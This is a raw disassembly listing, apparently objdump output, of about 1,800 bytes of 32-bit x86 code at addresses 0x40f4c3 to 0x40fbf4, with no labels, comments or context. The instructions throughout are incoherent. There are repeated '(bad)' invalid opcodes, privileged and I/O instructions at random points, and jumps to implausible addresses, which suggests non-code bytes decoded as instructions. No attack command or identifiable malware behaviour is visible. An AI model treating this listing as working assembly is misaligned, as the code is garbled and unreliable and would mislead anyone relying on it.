  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
